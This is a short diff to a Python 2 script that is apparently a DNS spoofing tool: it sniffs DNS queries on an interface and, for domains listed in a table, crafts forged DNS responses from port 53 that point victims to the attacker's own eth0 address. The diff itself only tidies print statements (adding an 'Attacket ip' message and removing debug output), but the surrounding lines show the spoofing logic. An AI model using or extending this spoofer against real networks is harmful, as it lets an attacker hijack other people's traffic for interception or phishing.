@@ -6,7 +6,7 @@ import socket
 
 #changeToIp = "173.252.89.132"
 changeToIp = netifaces.ifaddresses('eth0')[2][0]['addr']
-print changeToIp
+print "Attacket ip is : ",changeToIp
 interface = ""
 filename = ""
 BPFfilter = ""
@@ -14,11 +14,8 @@ domainTable = {}
 fflag = 0
 
 def arp_monitor_callback(pkt):
-	print pkt
-	print "fflag is ", fflag
 	url = pkt["DNS Question Record"].qname 
 	url = url[:-1]
-	print url
 	if fflag == 1 and url in domainTable:
 		spfResp = IP(dst=pkt[IP].src, src=pkt[IP].dst)\
 			/UDP(dport=pkt[UDP].sport, sport=53)\
@@ -44,7 +41,7 @@ for opt, arg in opts:
 
 BPFfilter = " ".join(str(x) for x in remainder)
 
-print "interface is ", interface
+print "Interface is ", interface
 
 if len(filename) > 0:
 	fflag = 1
